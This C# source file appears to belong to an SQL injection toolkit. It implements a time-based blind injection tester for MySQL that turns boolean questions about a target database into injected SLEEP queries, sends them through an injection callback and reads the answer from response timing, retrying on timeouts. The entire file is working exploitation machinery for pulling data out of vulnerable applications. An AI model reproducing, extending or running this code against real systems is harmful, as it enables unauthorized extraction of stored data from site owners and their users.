using System;
using System.Linq;
using System.Threading.Tasks;

namespace PeterJuhasz.SqlInjection
{
    using Microsoft.Extensions.Logging;
    using System.Diagnostics;
    using System.Net.Http;
    using static MySqlFunctions;

    public class TimeBasedHypothesisTester : IHypothesisTester
    {
        public TimeBasedHypothesisTester(SqlWriter writer, TimeBasedBlindSqlInjectionOptions options, ILogger<TimeBasedHypothesisTester> logger)
        {
            Writer = writer;
            Options = options;
            Logger = logger;
        }

        public SqlWriter Writer { get; }
        public TimeBasedBlindSqlInjectionOptions Options { get; }
        public ILogger<TimeBasedHypothesisTester> Logger { get; }

        public async Task<bool> TestAsync(IQueryable<bool> query)
        {
            if (query == null)
                throw new ArgumentNullException(nameof(query));

            var test = query.Select(condition => condition ? 1 : Sleep(Options.InjectedWaitTime.TotalSeconds)).Take(1);

            var visitor = new MySqlQueryModelVisitor(Writer);
            var sql = visitor.Render(test);

            while (true)
            {
                try
                {
                    Stopwatch stopwatch = Stopwatch.StartNew();

                    Logger.LogDebug(sql);
                    await Options.InjectAsync(sql);

                    stopwatch.Stop();

                    return stopwatch.Elapsed < Options.SuccessfulTime;
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("timed out") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("unrecognized response") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (OperationCanceledException)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
            }
        }
    }
}
